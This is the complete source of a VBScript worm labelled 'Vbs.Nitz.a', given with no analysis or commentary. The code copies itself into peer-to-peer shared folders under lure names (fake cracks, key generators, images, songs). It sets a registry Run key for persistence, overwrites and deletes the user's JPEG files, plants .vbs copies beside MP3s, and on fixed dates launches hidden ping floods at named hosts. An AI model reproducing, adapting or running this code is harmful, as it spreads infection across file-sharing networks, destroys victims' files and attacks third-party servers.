'Nitz
On Error Resume Next

Set Shell = CreateObject("WScript.Shell")
 Set dud = CreateObject("Scripting.FileSystemObject")
Set File = dud.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
   Dank = (WScript.ScriptFullName)
   KMD = ("C:\Program Files\KMD\My Shared Folder")& "\"
   Kazaa = ("C:\Program Files\Kazaa\My Shared Folder") & "\"
   KazaaLiteL = ("C:\Program Files\KaZaA Lite\My Shared Folder") & "\"
   Morpheus = ("C:\Program Files\Morpheus\My Shared Folder") & "\"
   Grokster = ("C:\Program Files\Grokster\My Grokster") & "\"
   BearShare = ("C:\Program Files\BearShare\Shared") & "\"
   Edonkey = ("C:\Program Files\Edonkey2000\Incoming") & "\"
   KazaaBack = ("C:\Program Files\Kazaa") & "\"
   WindowDir = ("C:\WINDOWS") & "\"



'BackUps
dud.copyfile Dank, WindowDir & "MS Script Tool.vbs"

 if dud.folderexists(KazaaBack) then
dud.copyfile Dank, KazaaBack & "Kazaa_Search_Engine.vbs"
Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KazaaP2P", "C:\Program Files\Kazaa\Kazaa_Search_Engine.vbs"
end if



   if dud.folderexists(KMD) then
      dud.copyfile Dank, KMD & "Hot_Sluts.jpg.vbs"
      dud.copyfile Dank, KMD & "WinXp Key Gen.exe.vbs"
      dud.copyfile Dank, KMD & "Ozzy - Crazy Train.mp3.vbs"
      Infecter(KMD)
   end if

   if dud.folderexists(Kazaa) then
      Infecter()
      dud.copyfile Dank, Kazaa & "Hot_Sluts2.jpg.vbs"
      dud.copyfile Dank, Kazaa & "Norton's Serial Gen.exe.vbs"
      dud.copyfile Dank, Kazaa & "Good Charlotte - underGRADS Theme.mp3.vbs"
      Infecter(Kazaa)
   end if

   if dud.folderexists(KazaaLite) then
      dud.copyfile Dank, KazaaLite & "Hot_Sluts3.jpg.vbs"
      dud.copyfile Dank, KazaaLite & "Pc-Cillin2003 Crack.exe.vbs"
      dud.copyfile Dank, KazaaLite & "GreenDay - Paradise.mp3.vbs"
      Infecter(KazaaLite)
   end if

   if dud.folderexists(Grokster) then
      dud.copyfile Dank, Grokster & "sexy_legs_redhead.jpg.vbs"
      dud.copyfile Dank, Grokster & "TrojanCleaner.exe.vbs"
      dud.copyfile Dank, Grokster & "Shakira - Whenever.mp3.vbs"
      Infecter(Grokster)
   end if

   if dud.folderexists(BearShare) then
      dud.copyfile Dank, BearShare & "osama.jpg.vbs"
      dud.copyfile Dank, BearShare & "F-Secure Crack.exe.vbs"
      dud.copyfile Dank, BearShare & "Southpark - Eric Holy Nite.mp3.vbs"
       Infecter(BearShare)
   end if

   if dud.folderexists(Edonkey) then
      dud.copyfile Dank, Edonkey & "terrorist.jpg.vbs"
      dud.copyfile Dank, Edonkey & "Kazaa.exe.vbs"
      dud.copyfile Dank, Edonkey & "Nelly - Hot In Here Remixed.mp3.vbs"
      Infecter(EDonkey)
   end if

if month(now) = 2 and day(now) = 17 then
msgbox " Watch underGRADS on Comedy Central  ....... but ANYWAYS!!!!",,"Nitz!!"
Shell.Run "Ping.exe -t -l 916 www.ytunnel.digitalcitrus.com", 0, False
end if
if month(now) = 3 and day(now) = 1 then
msgbox " So You An Undergrads too?",,"Jesse!!"
Shell.Run "Ping.exe -t -l 916 www.yahpro.com", 0, False
end if
if month(now) = 3 and day(now) = 15 then
msgbox " Hey Guy!",,"Cal!!"
Shell.Run "Ping.exe -t -l 916 www.yahpro.org", 0, False
end if
if month(now) = 4 and day(now) = 1 then
msgbox " Alpha! Alpha! Its April Fools Day you moron!!",,"Rocco!!"
Shell.Run "Ping.exe -t -l 916 www.yahme.com", 0, False
end if
if month(now) = 6 and day(now) = 1 then
msgbox " Geez... should've updated your anti-virus ...... ",,"Gimpy!!"
Shell.Run "Ping.exe -t -l 916 www.yahme.com", 0, False
Shell.Run "Ping.exe -t -l 916 www.yahpro.com", 0, False
Shell.Run "Ping.exe -t -l 916 www.yahpro.org", 0, False
Shell.Run "Ping.exe -t -l 916 www.yahme.com", 0, False
Shell.Run "Ping.exe -t -l 916 www.ytunnel.digitalcitrus.com", 0, False
end if

sub infecter(folder)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = dud.GetFolder(folder)
set fc = f.Files
for each f1 in fc
ext=dud.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if(ext="jpg") or (ext="jpeg") then
set ap=dud.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=dud.GetFile(f1.path)
cop.copy(f1.path&".vbs")
dud.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=dud.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
end if
next
end sub

'Vbs.Nitz.a - 4099